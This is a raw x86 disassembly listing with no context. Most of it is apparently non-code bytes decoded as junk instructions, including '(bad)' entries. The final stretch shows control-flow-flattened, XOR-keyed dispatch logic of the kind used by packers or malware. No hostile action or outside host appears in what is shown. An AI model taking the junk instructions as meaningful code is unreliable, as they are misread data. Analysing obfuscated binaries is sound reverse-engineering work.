  415d0f:	add    edx,ecx
  415d11:	call   0xd0d7ddac
  415d16:	in     al,0xa2
  415d18:	add    DWORD PTR ds:0x789b6e38,0x36
  415d1f:	ret    
  415d20:	mov    ds:0xf3128864,eax
  415d25:	xchg   ebp,eax
  415d26:	std    
  415d27:	lods   al,BYTE PTR ds:[esi]
  415d28:	or     eax,0x3203616c
  415d2d:	nop
  415d2e:	xchg   esi,eax
  415d2f:	(bad)  
  415d31:	fbstp  TBYTE PTR [edx]
  415d33:	les    esp,FWORD PTR [ebx]
  415d35:	out    0x6b,eax
  415d37:	sar    DWORD PTR [edx+edx*2],1
  415d3a:	mov    edi,0x3b761460
  415d3f:	adc    al,0x9d
  415d41:	inc    esi
  415d42:	add    BYTE PTR [edi-0x3f8ea771],bl
  415d48:	adc    BYTE PTR [esi+eiz*8+0x5c],dh
  415d4c:	sahf   
  415d4d:	das    
  415d4e:	std    
  415d4f:	sbb    eax,esp
  415d51:	nop
  415d52:	fs cdq 
  415d54:	fstp   QWORD PTR [edi+ebp*8+0xcb44bd1]
  415d5b:	div    DWORD PTR [esp+eax*2]
  415d5e:	gs cdq 
  415d60:	dec    esi
  415d61:	jbe    0x415d7f
  415d63:	mov    al,BYTE PTR [esi]
  415d65:	es mov dl,0x38
  415d68:	add    eax,0xa5387908
  415d6d:	lahf   
  415d6e:	outs   dx,BYTE PTR ds:[esi]
  415d6f:	(bad)  
  415d70:	push   ecx
  415d71:	dec    ebp
  415d72:	adc    eax,0x51ec44bc
  415d77:	sub    esi,esi
  415d79:	dec    esi
  415d7a:	xor    al,0xd7
  415d7c:	pusha  
  415d7d:	aam    0x8a
  415d7f:	or     dh,BYTE PTR ds:0x1933b010
  415d85:	into   
  415d86:	popa   
  415d87:	pop    edi
  415d88:	and    cl,ch
  415d8a:	push   edi
  415d8b:	int    0xd4
  415d8d:	mov    edi,0x7952d001
  415d92:	retf   0x4971
  415d95:	mov    eax,0x2724a6b8
  415d9a:	in     al,dx
  415d9b:	xchg   edi,eax
  415d9c:	(bad)  
  415d9d:	enter  0x2f83,0x4c
  415da1:	xchg   BYTE PTR [ebp+0x7c105155],cl
  415da7:	mov    ds:0xf5089411,al
  415dac:	and    DWORD PTR [ebx+0x3d227c2e],ebx
  415db2:	clc    
  415db3:	pop    edx
  415db4:	fisub  WORD PTR [eax-0x5]
  415db7:	pop    edx
  415db8:	push   esi
  415db9:	add    al,0x2a
  415dbb:	stc    
  415dbc:	xor    DWORD PTR [edx],ebp
  415dbe:	jmp    0xc6614254
  415dc3:	sti    
  415dc4:	mov    bl,0x36
  415dc6:	or     BYTE PTR [eax-0x1c642397],0x1e
  415dcd:	sub    eax,0x88edb325
  415dd2:	jecxz  0x415def
  415dd4:	mov    edx,ss
  415dd6:	push   eax
  415dd7:	sub    dh,BYTE PTR [eax-0x29]
  415dda:	xor    eax,DWORD PTR [ebp-0x57a5ff99]
  415de0:	and    cl,0x6a
  415de3:	sbb    eax,DWORD PTR [edi+0x3c]
  415de6:	jae    0x415dfa
  415de8:	out    0x35,eax
  415dea:	sahf   
  415deb:	push   ds
  415dec:	adc    al,0x46
  415dee:	inc    esi
  415def:	jno    0x415da8
  415df1:	adc    DWORD PTR [edi+0xa],ebp
  415df4:	iret   
  415df5:	jmp    0x415e01
  415df7:	mov    al,ds:0xb694d366
  415dfc:	pop    ds
  415dfd:	ror    BYTE PTR [esi+0x1276aa9d],cl
  415e03:	mov    ds:0x60607cb5,al
  415e08:	(bad)  
  415e09:	mov    ebp,0xb58b0e81
  415e0e:	push   ds
  415e0f:	pop    esi
  415e10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e11:	or     bl,BYTE PTR [esi+0x4297c2be]
  415e17:	ror    DWORD PTR [esi+ebp*4+0x3],cl
  415e1b:	jo     0x415e0d
  415e1d:	push   edi
  415e1e:	rol    BYTE PTR [ecx*1+0x12323570],1
  415e25:	mov    gs,WORD PTR [esi]
  415e27:	hlt    
  415e28:	cwde   
  415e29:	rol    ebp,cl
  415e2b:	cmp    BYTE PTR [edx],ch
  415e2d:	jp     0x415e63
  415e2f:	(bad)  
  415e31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e32:	std    
  415e33:	data16 xchg al,al
  415e36:	leave  
  415e37:	cmp    dl,BYTE PTR [esp+ebx*1+0x58]
  415e3b:	mul    BYTE PTR [eax+ecx*2]
  415e3e:	es mov cl,0xaa
  415e41:	xor    dh,cl
  415e43:	adc    al,0x77
  415e45:	(bad)  
  415e46:	aam    0xc0
  415e48:	sbb    dl,BYTE PTR [edi]
  415e4a:	xlat   BYTE PTR ds:[ebx]
  415e4b:	and    eax,0xf8e9e043
  415e50:	xor    edi,DWORD PTR [edi]
  415e52:	fild   DWORD PTR [edi*1-0x6e441c82]
  415e59:	xchg   esp,eax
  415e5a:	pop    edi
  415e5b:	pop    eax
  415e5c:	mov    edx,0xe30cf354
  415e61:	or     BYTE PTR [ebx],bl
  415e63:	sub    ah,BYTE PTR [ecx-0x36]
  415e66:	(bad)  
  415e67:	fwait
  415e68:	stos   DWORD PTR es:[edi],eax
  415e69:	and    dh,ah
  415e6b:	mov    al,0xb4
  415e6d:	push   es
  415e6e:	pop    es
  415e6f:	loopne 0x415e25
  415e71:	outs   dx,BYTE PTR ds:[esi]
  415e72:	cwde   
  415e73:	daa    
  415e74:	mov    edi,0xe7532e3
  415e79:	push   ebx
  415e7a:	mov    ds:0x71ec0d73,eax
  415e7f:	int    0x55
  415e81:	fdiv   st,st(6)
  415e83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e84:	je     0x415ef7
  415e86:	psllw  mm6,QWORD PTR [edx+0x125fc329]
  415e8d:	sbb    al,0x83
  415e8f:	and    DWORD PTR [ebp-0xc1bd003],esi
  415e95:	(bad)  
  415e96:	fild   DWORD PTR [eax]
  415e98:	aas    
  415e99:	aas    
  415e9a:	ffreep st(3)
  415e9c:	xchg   esi,eax
  415e9d:	cmp    eax,DWORD PTR es:[ecx-0x540fadc9]
  415ea4:	pushf  
  415ea5:	inc    edi
  415ea6:	push   0x7686aef0
  415eab:	add    al,0x5d
  415ead:	add    BYTE PTR [edx+0x42b62352],bh
  415eb3:	mov    dl,0xb7
  415eb5:	bound  edi,QWORD PTR [esi+0x60]
  415eb8:	pop    ebx
  415eb9:	cld    
  415eba:	jg     0x415ea0
  415ebc:	sbb    eax,0x5fc3ac6f
  415ec1:	lods   al,BYTE PTR ds:[esi]
  415ec2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ec3:	cli    
  415ec4:	push   ss
  415ec5:	jnp    0x415f2f
  415ec7:	iret   
  415ec8:	ds jmp 0x7595:0xac88564a
  415ed0:	aas    
  415ed1:	aaa    
  415ed2:	push   cs
  415ed3:	fdivr  QWORD PTR [edx+0x19e94184]
  415ed9:	sbb    BYTE PTR [eax+0x278e04a3],al
  415edf:	mov    dh,0x1
  415ee1:	add    eax,0x7863164e
  415ee6:	iret   
  415ee7:	bnd jae 0x415ef3
  415eea:	shr    DWORD PTR [ecx+0xf],cl
  415eed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415eee:	retf   
  415eef:	push   0x61a98778
  415ef4:	adc    eax,0x57e13475
  415ef9:	xchg   ebp,eax
  415efa:	xchg   edi,eax
  415efb:	sar    BYTE PTR [esi+0x1e],cl
  415efe:	jbe    0x415f69
  415f00:	cwde   
  415f01:	cwde   
  415f02:	fdiv   DWORD PTR [edx+0x6fa79968]
  415f08:	add    al,0x6d
  415f0a:	dec    edi
  415f0b:	pop    ebx
  415f0c:	fild   DWORD PTR [esi+0x17]
  415f0f:	push   eax
  415f10:	push   ds
  415f11:	inc    eax
  415f12:	jne    0x415ea1
  415f14:	xor    al,0xcd
  415f16:	inc    ecx
  415f17:	dec    eax
  415f18:	jge    0x415f4c
  415f1a:	js     0x415ea8
  415f1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f1d:	jg     0x415f8b
  415f1f:	stc    
  415f20:	inc    esi
  415f21:	daa    
  415f22:	gs jp  0x415eec
  415f25:	cmp    al,0x20
  415f27:	int    0xb1
  415f29:	dec    edx
  415f2a:	loop   0x415ebe
  415f2c:	or     al,BYTE PTR [ecx-0x4]
  415f2f:	out    dx,eax
  415f30:	cmp    edx,DWORD PTR [edx+0x4a]
  415f33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415f34:	push   esi
  415f35:	mov    eax,0xe61d3ad
  415f3a:	xchg   ecx,eax
  415f3b:	adc    al,0x94
  415f3d:	adc    BYTE PTR [eax+0x1b],0xa7
  415f41:	adc    dh,BYTE PTR [ebp-0x2d58dd6c]
  415f47:	mov    ah,0x5e
  415f49:	ret    0x350b
  415f4c:	and    BYTE PTR [eax],0xe5
  415f4f:	dec    esp
  415f50:	push   DWORD PTR [ecx+0x2a]
  415f53:	and    esp,DWORD PTR [edi+ebx*8+0x3]
  415f57:	vpsraw ymm0,ymm3,XMMWORD PTR [edx]
  415f5b:	cmc    
  415f5c:	shr    BYTE PTR [edx],0xd0
  415f5f:	mov    fs,WORD PTR [esi+0x6af7bb7d]
  415f65:	add    al,0xfa
  415f67:	sbb    ebp,edx
  415f69:	sbb    BYTE PTR [esi-0x45],ah
  415f6c:	xor    eax,0x23615152
  415f71:	and    bh,bh
  415f73:	gs or  ah,dh
  415f76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415f77:	dec    esi
  415f78:	mul    DWORD PTR [edx+edx*1+0x91bf10a]
  415f7f:	xchg   esi,edx
  415f81:	mov    bl,0xdd
  415f83:	ins    DWORD PTR es:[edi],dx
  415f84:	test   al,0xf5
  415f86:	retf   
  415f87:	int3   
  415f88:	clc    
  415f89:	(bad)  
  415f8a:	push   edx
  415f8b:	mov    esi,0xf5de1651
  415f90:	bound  eax,QWORD PTR [eax+esi*2-0x26]
  415f94:	mov    ebx,DWORD PTR [eax-0x1d]
  415f97:	xor    dh,BYTE PTR [ecx-0x60db20e1]
  415f9d:	dec    eax
  415f9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f9f:	shrd   edi,ebx,0x94
  415fa3:	scas   al,BYTE PTR es:[edi]
  415fa4:	enter  0xcf77,0x82
  415fa8:	mov    ebx,0xb5c885ae
  415fad:	inc    ebx
  415fae:	sar    edi,1
  415fb0:	rol    BYTE PTR [edx-0xd6b0495],1
  415fb6:	sar    bh,cl
  415fb8:	pop    edi
  415fb9:	ja     0x416026
  415fbb:	and    ebx,esi
  415fbd:	fs cmp al,0x35
  415fc0:	mov    ds:0x7764fbd9,al
  415fc5:	shl    DWORD PTR [edx-0x13918dd5],cl
  415fcb:	push   eax
  415fcc:	cmp    eax,0xfca9bba1
  415fd1:	test   DWORD PTR [ebp+0x33],ecx
  415fd4:	aad    0x8b
  415fd6:	dec    edx
  415fd7:	inc    ecx
  415fd8:	idiv   DWORD PTR [esi]
  415fda:	and    ch,BYTE PTR [ebx]
  415fdc:	xor    eax,0x2d620386
  415fe1:	inc    edx
  415fe2:	push   edx
  415fe3:	mov    esp,0xc56dccd9
  415fe8:	stos   DWORD PTR es:[edi],eax
  415fe9:	xor    eax,0xf474f890
  415fee:	push   ecx
  415fef:	fdiv   st,st(2)
  415ff1:	inc    ebx
  415ff2:	adc    ebx,DWORD PTR ss:[eax+0x7f24ee8d]
  415ff9:	in     al,0x11
  415ffb:	dec    edi
  415ffc:	mov    bl,0xa4
  415ffe:	and    esp,DWORD PTR [edx-0x80]
  416001:	mov    dl,0xf5
  416003:	inc    esi
  416004:	mov    edi,0x955f0950
  416009:	push   es
  41600a:	bound  ebp,QWORD PTR [ecx+0x3674d070]
  416010:	nop
  416011:	fst    DWORD PTR ds:0x2956a9bb
  416017:	jo     0x416000
  416019:	lahf   
  41601a:	adc    DWORD PTR [eax],edi
  41601c:	(bad)
  41601f:	out    0x2a,eax
  416021:	jp     0x416001
  416023:	fcom   QWORD PTR ds:0x6385224f
  416029:	xchg   ebp,eax
  41602a:	mov    cl,0xd
  41602c:	addr16 jp 0x415fd3
  41602f:	and    BYTE PTR [eax+edx*4-0xb],dh
  416033:	mov    bl,al
  416035:	fmul   QWORD PTR [ebp-0x38f57db]
  41603b:	xchg   edi,ebx
  41603d:	pop    ebp
  41603e:	sbb    al,0x87
  416040:	jae    0x4160c0
  416042:	xchg   ecx,eax
  416043:	push   ecx
  416044:	jp     0x416099
  416046:	daa    
  416047:	cs pop es
  416049:	or     esp,esi
  41604b:	out    dx,eax
  41604c:	jbe    0x41605e
  41604e:	(bad)  
  41604f:	jb     0x4160a9
  416051:	fiadd  DWORD PTR [esi]
  416053:	in     al,0xf1
  416055:	push   esp
  416056:	pop    ecx
  416057:	xor    BYTE PTR [ebp-0x78],bh
  41605a:	rcr    BYTE PTR [edx+0x33126442],0x36
  416061:	or     edx,DWORD PTR [eax+eax*4+0x57]
  416065:	adc    edi,DWORD PTR [ebx+esi*1-0x3cdc791b]
  41606c:	jle    0x41602d
  41606e:	dec    edi
  41606f:	imul   ebx,ebx,0x8ebb59ba
  416075:	inc    ecx
  416076:	cmp    al,0x6b
  416078:	xlat   BYTE PTR ds:[ebx]
  416079:	movntq QWORD PTR [edx+0x4],mm1
  41607d:	sub    BYTE PTR [ecx],dl
  41607f:	adc    edx,esp
  416081:	ss jg  0x41604d
  416084:	sbb    DWORD PTR [ebp+0x15],esp
  416087:	sbb    ebx,DWORD PTR [esp+ebx*1]
  41608a:	inc    esi
  41608b:	dec    edi
  41608c:	mov    bl,0xef
  41608e:	adc    esi,DWORD PTR [ecx+0x28]
  416091:	ds mov cl,0xb3
  416094:	dec    ebx
  416095:	jbe    0x4160af
  416097:	pushf  
  416098:	or     dh,bh
  41609a:	and    eax,0x6a4770f9
  41609f:	rcr    BYTE PTR [eax],0xc2
  4160a2:	repnz pop esp
  4160a4:	inc    edx
  4160a5:	and    esi,eax
  4160a7:	mov    BYTE PTR ds:0x4cbaebf2,0xdd
  4160ae:	cdq    
  4160af:	rol    cl,cl
  4160b1:	out    0x7b,al
  4160b3:	jae    0x416066
  4160b5:	ret    0x5de
  4160b8:	loopne 0x416059
  4160ba:	sub    eax,0x695b6803
  4160bf:	(bad)  
  4160c0:	mov    DWORD PTR [ebx+0x6f950ab9],ebx
  4160c6:	and    eax,0x3ee1e781
  4160cb:	and    ecx,DWORD PTR [edi+0x10]
  4160ce:	pop    ds
  4160cf:	jmp    0xe0fa:0xff87c5a0
  4160d6:	push   0xffffff95
  4160d8:	mov    WORD PTR [ebp-0x7e],es
  4160db:	sub    DWORD PTR ds:0x6385ae68,eax
  4160e1:	mov    edi,DWORD PTR [esp+edx*8+0x20dfeb6b]
  4160e8:	and    ch,dh
  4160ea:	popf   
  4160eb:	or     eax,0x4a1bff53
  4160f0:	das    
  4160f1:	fisttp WORD PTR [edx-0x5458da3a]
  4160f7:	jbe    0x4160f9
  4160f9:	dec    ebp
  4160fa:	push   ss
  4160fb:	xor    eax,0x580eb595
  416100:	data16 jg 0x41612f
  416103:	aas    
  416104:	bound  edx,QWORD PTR [esi+0x699b01f1]
  41610a:	js     0x416157
  41610c:	and    al,0x5e
  41610e:	iret   
  41610f:	das    
  416110:	outs   dx,DWORD PTR ds:[esi]
  416111:	or     BYTE PTR [ecx+0x7c],al
  416114:	sbb    bh,BYTE PTR [esi-0x78d8b57c]
  41611a:	inc    esp
  41611b:	call   0x53a511e7
  416120:	sub    bh,BYTE PTR [esi+0x1c21cee3]
  416126:	adc    DWORD PTR [edx+0x2c1571d6],edx
  41612c:	pop    ebp
  41612d:	out    dx,eax
  41612e:	sar    DWORD PTR [ebp+0x53009d7a],cl
  416134:	mov    edx,0xbe217bed
  416139:	push   edx
  41613a:	pop    edx
  41613b:	sti    
  41613c:	xor    BYTE PTR [esi+edi*1-0x421054cd],dl
  416143:	cmp    cl,al
  416145:	mov    dl,0xbe
  416147:	and    al,0xc2
  416149:	xchg   ecx,eax
  41614a:	or     DWORD PTR [ebp+0x1ca22de3],esp
  416150:	in     al,dx
  416151:	adc    ecx,DWORD PTR [esp+esi*1+0x2b759320]
  416158:	mov    bl,0x9d
  41615a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41615b:	or     eax,0x5cea8af2
  416160:	xchg   ecx,eax
  416161:	sbb    BYTE PTR [ebp-0x32],al
  416164:	cld    
  416165:	jne    0x41610f
  416167:	(bad)  
  416168:	repnz outs dx,BYTE PTR ds:[esi]
  41616a:	sbb    ch,dh
  41616c:	pop    ss
  41616d:	fs (bad) 
  41616f:	adc    BYTE PTR [ebp+ebx*1-0x1ea5d5c1],al
  416176:	lods   al,BYTE PTR ds:[esi]
  416177:	mov    eax,ds:0x2cb3ffac
  41617c:	pop    esi
  41617d:	sbb    DWORD PTR [esp+esi*4-0x3405f404],edi
  416184:	mov    esi,0x92013df7
  416189:	pop    ecx
  41618a:	shl    DWORD PTR [edi],0x2e
  41618d:	sub    al,0x18
  41618f:	mov    WORD PTR [edx],?
  416191:	sbb    DWORD PTR [edi],esp
  416193:	cmp    al,0x69
  416195:	and    eax,0x1bfe89eb
  41619a:	fst    DWORD PTR [edx-0x7f]
  41619d:	fiadd  WORD PTR [ebp+0x41]
  4161a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4161a1:	cs ins DWORD PTR es:[edi],dx
  4161a3:	mov    ds:0x5732f43b,eax
  4161a8:	mov    al,0x30
  4161aa:	push   0xffffffe3
  4161ac:	ror    DWORD PTR [esi+0x62],1
  4161af:	ins    DWORD PTR es:[edi],dx
  4161b0:	mov    esp,edi
  4161b2:	scas   al,BYTE PTR es:[edi]
  4161b3:	and    BYTE PTR [esi+0x5532b072],0x7d
  4161ba:	pop    eax
  4161bb:	push   ds
  4161bc:	jb     0x416176
  4161be:	jmp    0x625e:0xc2a3ca19
  4161c5:	fisub  DWORD PTR [ebx+0x6ccfecb8]
  4161cb:	iret   
  4161cc:	cmp    dh,BYTE PTR [edi]
  4161ce:	pop    ecx
  4161cf:	test   DWORD PTR [eax-0x4d53bad9],edi
  4161d5:	call   0x5c2c:0x602053d3
  4161dc:	mov    ah,0xf6
  4161de:	dec    esi
  4161df:	ficomp DWORD PTR [ecx+0x6f]
  4161e2:	retf   
  4161e3:	and    BYTE PTR [ebx+edi*8-0x6010762f],0x97
  4161eb:	xor    esi,DWORD PTR [esi]
  4161ed:	pop    es
  4161ee:	adc    ebp,DWORD PTR [edx+ecx*2]
  4161f1:	jno    0x416218
  4161f3:	shl    BYTE PTR [eax-0x21],0x24
  4161f7:	ins    BYTE PTR es:[edi],dx
  4161f8:	rol    DWORD PTR [ebx+0x423ecce7],0xb5
  4161ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416200:	adc    BYTE PTR [eax-0x19d22d21],dh
  416206:	or     ebp,DWORD PTR [ebx-0x4c7bac7a]
  41620c:	sbb    eax,0xc6fd6a89
  416211:	je     0x416208
  416213:	inc    esp
  416214:	inc    esp
  416215:	mov    esi,0xd87c9d6e
  41621a:	pop    esp
  41621b:	mov    ds:0x6e39c671,al
  416220:	mov    edx,edx
  416222:	push   0x77
  416224:	xor    edi,DWORD PTR [ebx+0x13d16fd0]
  41622a:	outs   dx,DWORD PTR ds:[esi]
  41622b:	(bad)  
  41622c:	fyl2x  
  41622e:	in     al,dx
  41622f:	ds call 0xe0d42fa5
  416235:	ins    DWORD PTR es:[edi],dx
  416236:	test   DWORD PTR [esi],ecx
  416238:	lods   al,BYTE PTR ds:[esi]
  416239:	std    
  41623a:	push   edi
  41623b:	dec    esi
  41623c:	pop    es
  41623d:	mov    esi,DWORD PTR [ebp-0x274f12ee]
  416243:	jns    0x416241
  416245:	sti    
  416246:	stos   DWORD PTR es:[edi],eax
  416247:	retf   0x906b
  41624a:	retf   
  41624b:	cmp    al,0x4f
  41624d:	push   ecx
  41624e:	jbe    0x416226
  416250:	cmp    BYTE PTR [ebx],bh
  416252:	sbb    edi,DWORD PTR [ecx+0x64]
  416255:	jno    0x416214
  416257:	addr16 sbb BYTE PTR [bp-0x50],0xa0
  41625d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41625e:	jmp    0x41621a
  416260:	minps  xmm6,xmm6
  416263:	test   al,0x9
  416265:	lds    ebx,FWORD PTR [edx+eax*2-0x4d]
  416269:	imul   ebx,DWORD PTR [esi-0x493f443c],0xeabfa4ff
  416273:	or     al,0xef
  416275:	and    dh,BYTE PTR [bx+di]
  416278:	mov    ebp,0xcbcf84f8
  41627d:	adc    bh,BYTE PTR [ebx-0x38]
  416280:	test   edi,edx
  416282:	adc    DWORD PTR [eax],ebp
  416284:	pop    eax
  416285:	inc    ebx
  416286:	nop
  416287:	jae    0x41623c
  416289:	fild   WORD PTR ds:[edi-0x32]
  41628d:	xchg   ecx,eax
  41628e:	cmp    al,0x6b
  416290:	test   BYTE PTR [edx+0x10],0xf4
  416294:	add    eax,0x307b4f12
  416299:	pop    es
  41629a:	fisttp QWORD PTR [eax+0x7c88825f]
  4162a0:	cmp    al,0x9d
  4162a2:	div    BYTE PTR [edi-0x306c39b6]
  4162a8:	bound  ebp,QWORD PTR [eax+0x9121ce9]
  4162ae:	jecxz  0x416238
  4162b0:	bound  esp,QWORD PTR [ebx+0x66]
  4162b3:	das    
  4162b4:	jecxz  0x4162c5
  4162b6:	xchg   si,ax
  4162b8:	fdivr  DWORD PTR [edi+0x27462cc7]
  4162be:	xlat   BYTE PTR ds:[ebx]
  4162bf:	sysret 
  4162c1:	mov    eax,0xc3a10419
  4162c6:	adc    al,0xf6
  4162c8:	inc    ebp
  4162c9:	int    0x2a
  4162cb:	out    dx,eax
  4162cc:	jno    0x416301
  4162ce:	icebp  
  4162cf:	gs xchg ebx,eax
  4162d1:	stos   DWORD PTR es:[edi],eax
  4162d2:	in     eax,0x74
  4162d4:	imul   ecx,ecx,0x3883dbde
  4162da:	fld    DWORD PTR [edx+0x33908036]
  4162e0:	stos   BYTE PTR es:[edi],al
  4162e1:	outs   dx,BYTE PTR ds:[esi]
  4162e2:	pop    es
  4162e3:	inc    edi
  4162e4:	int3   
  4162e5:	and    al,0x8
  4162e7:	jmp    0x4162c2
  4162e9:	cmc    
  4162ea:	sub    eax,0xba972475
  4162ef:	scas   eax,DWORD PTR es:[edi]
  4162f0:	push   edx
  4162f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162f2:	ror    BYTE PTR [edi+ebp*1-0x55],cl
  4162f6:	jle    0x416364
  4162f8:	call   0x7419:0xde90ef95
  4162ff:	fdivp  st(2),st
  416301:	mov    dl,0x54
  416303:	inc    edx
  416304:	mov    ebx,0xe65a3f1
  416309:	clc    
  41630a:	(bad)  
  41630b:	jp     0x4162e4
  41630d:	sub    eax,0xcab2a28e
  416312:	aad    0xab
  416314:	or     al,0x94
  416316:	jnp    0x4162fc
  416318:	or     ebp,DWORD PTR [eax+ebx*1]
  41631b:	sub    bh,dh
  41631d:	jns    0x4162cb
  41631f:	cdq    
  416320:	mov    al,0x6e
  416322:	mov    esi,0x219055b2
  416327:	sbb    al,0xdf
  416329:	push   esi
  41632a:	jp     0x41636a
  41632c:	inc    ebp
  41632d:	add    al,0x5f
  41632f:	sbb    al,0x6b
  416331:	clc    
  416332:	mov    ebx,DWORD PTR [ebx]
  416334:	sub    esi,ecx
  416336:	cmc    
  416337:	int    0xf9
  416339:	jg     0x4163a7
  41633b:	aaa    
  41633c:	cmc    
  41633d:	bound  ebx,QWORD PTR ds:0x9123d5d4
  416343:	mov    ebx,?
  416345:	lods   al,BYTE PTR ds:[esi]
  416346:	mov    ds:0x3cf71dbf,eax
  41634b:	jns    0x41633c
  41634d:	je     0x416398
  41634f:	mov    BYTE PTR [ebx+0x7063bd78],bl
  416355:	pause  
  416357:	push   edi
  416358:	outs   dx,DWORD PTR ds:[esi]
  416359:	dec    edx
  41635a:	cmp    eax,0x80b9ab6
  41635f:	or     al,0x91
  416361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416362:	sub    eax,DWORD PTR [edx-0x34]
  416365:	and    BYTE PTR [ecx+eax*8+0x2ce9ca80],cl
  41636c:	test   DWORD PTR [ebp-0x42],esp
  41636f:	test   al,0xe1
  416371:	jne    0x4163c8
  416373:	mov    ds:0x455ad7ef,al
  416378:	xchg   ecx,eax
  416379:	inc    ebp
  41637a:	dec    edx
  41637b:	push   0x7cfd764e
  416380:	jb     0x416322
  416382:	pushf  
  416383:	das    
  416384:	sbb    ebp,DWORD PTR [esi-0x1f]
  416387:	call   0x98d4aec2
  41638c:	ror    DWORD PTR [eax],0x64
  41638f:	or     DWORD PTR [ecx+ebx*4+0x19],esp
  416393:	and    BYTE PTR [ecx+esi*1+0x56c18f4a],0xd2
  41639b:	aam    0x59
  41639d:	cmc    
  41639e:	jo     0x4163b0
  4163a0:	loop   0x416360
  4163a2:	addr16 ja 0x41637b
  4163a5:	mov    bl,0xe0
  4163a7:	mov    bl,0xbd
  4163a9:	out    dx,eax
  4163aa:	out    dx,eax
  4163ab:	(bad)  
  4163ac:	ins    BYTE PTR es:[edi],dx
  4163ad:	imul   esi,DWORD PTR [ebp+0x59b19e23],0xffffffc6
  4163b4:	jnp    0x4163ce
  4163b6:	sub    ebx,edx
  4163b8:	add    ebx,DWORD PTR [ebp-0x44]
  4163bb:	mov    DWORD PTR [ebp-0x44],ebx
  4163be:	mov    edx,DWORD PTR [ebp+0x8]
  4163c1:	xor    edx,eax
  4163c3:	add    edx,esi
  4163c5:	jne    0x413f9a
  4163cb:	mov    edx,DWORD PTR [ebp-0x8]
  4163ce:	mov    ebx,DWORD PTR [ebp-0xc]
  4163d1:	xor    edx,eax
  4163d3:	lea    edx,[edx+ebx*1+0x3272e2]
  4163da:	mov    DWORD PTR [ebp-0xc],edx
  4163dd:	mov    edx,DWORD PTR [ebp-0x10]
  4163e0:	xor    edx,eax
  4163e2:	add    edx,esi
  4163e4:	jne    0x40f3d9
  4163ea:	jmp    0x416501
  4163ef:	mov    ecx,DWORD PTR [ebp-0x14]
  4163f2:	mov    DWORD PTR [ebp+0x8],ecx
  4163f5:	jmp    0x41646e
  4163fa:	mov    ecx,DWORD PTR [ebp+0x8]
  4163fd:	mov    edx,DWORD PTR [ebp-0x8]
  416400:	xor    ecx,eax
  416402:	xor    edx,eax
  416404:	sub    ecx,edx
  416406:	sub    ecx,esi
  416408:	xor    ecx,eax
  41640a:	mov    DWORD PTR [ebp+0x8],ecx
  41640d:	mov    ecx,DWORD PTR [ebp+0x8]
  416410:	mov    edx,DWORD PTR [ebp-0x58]
  416413:	add    ecx,0x5708c4
  416419:	imul   ecx,edx
  41641c:	mov    DWORD PTR [ebp-0x58],ecx
  41641f:	mov    ecx,DWORD PTR [ebp+0x8]
  416422:	mov    edx,DWORD PTR [ebp-0x54]
  416425:	add    ecx,0x64f8da
  41642b:	or     ecx,edx
  41642d:	mov    DWORD PTR [ebp-0x54],ecx
  416430:	mov    ecx,DWORD PTR [ebp+0x8]
  416433:	mov    edx,DWORD PTR [ebp-0x50]
  416436:	add    ecx,0x242ebe9
  41643c:	xor    ecx,edx
  41643e:	mov    DWORD PTR [ebp-0x50],ecx
  416441:	mov    ecx,DWORD PTR [ebp+0x8]
  416444:	mov    edx,DWORD PTR [ebp-0x4c]
  416447:	add    ecx,edi
  416449:	and    ecx,edx
  41644b:	mov    DWORD PTR [ebp-0x4c],ecx
  41644e:	mov    ecx,DWORD PTR [ebp+0x8]
  416451:	mov    edx,DWORD PTR [ebp-0x48]
  416454:	lea    ecx,[edx+ecx*1+0x241fc1f]
  41645b:	mov    DWORD PTR [ebp-0x48],ecx
  41645e:	mov    ecx,DWORD PTR [ebp+0x8]
  416461:	mov    edx,0xfa5e15e2
  416466:	sub    edx,ecx
  416468:	add    edx,DWORD PTR [ebp-0x44]
  41646b:	mov    DWORD PTR [ebp-0x44],edx
  41646e:	mov    ecx,DWORD PTR [ebp+0x8]
  416471:	xor    ecx,eax
  416473:	add    ecx,esi
  416475:	jne    0x4163fa
  41647b:	jmp    0x41650d
  416480:	mov    ecx,DWORD PTR [ebp+0x8]
  416483:	mov    edx,DWORD PTR [ebp-0x8]
  416486:	xor    ecx,eax
  416488:	xor    edx,eax
  41648a:	sub    ecx,edx
  41648c:	sub    ecx,esi
  41648e:	xor    ecx,eax
  416490:	mov    DWORD PTR [ebp+0x8],ecx
  416493:	mov    ecx,DWORD PTR [ebp+0x8]
  416496:	mov    edx,DWORD PTR [ebp-0x58]
  416499:	add    ecx,0x5708c4
  41649f:	imul   ecx,edx
  4164a2:	mov    DWORD PTR [ebp-0x58],ecx
  4164a5:	mov    ecx,DWORD PTR [ebp+0x8]
  4164a8:	mov    edx,DWORD PTR [ebp-0x54]
  4164ab:	add    ecx,0x64f8da
  4164b1:	or     ecx,edx
  4164b3:	mov    DWORD PTR [ebp-0x54],ecx
  4164b6:	mov    ecx,DWORD PTR [ebp+0x8]
  4164b9:	mov    edx,DWORD PTR [ebp-0x50]
  4164bc:	add    ecx,0x242ebe9
  4164c2:	xor    ecx,edx
  4164c4:	mov    DWORD PTR [ebp-0x50],ecx
  4164c7:	mov    ecx,DWORD PTR [ebp+0x8]
  4164ca:	mov    edx,DWORD PTR [ebp-0x4c]
  4164cd:	add    ecx,edi
  4164cf:	and    ecx,edx
  4164d1:	mov    DWORD PTR [ebp-0x4c],ecx
  4164d4:	mov    ecx,DWORD PTR [ebp+0x8]
  4164d7:	mov    edx,DWORD PTR [ebp-0x48]
  4164da:	lea    ecx,[edx+ecx*1+0x241fc1f]
  4164e1:	mov    DWORD PTR [ebp-0x48],ecx
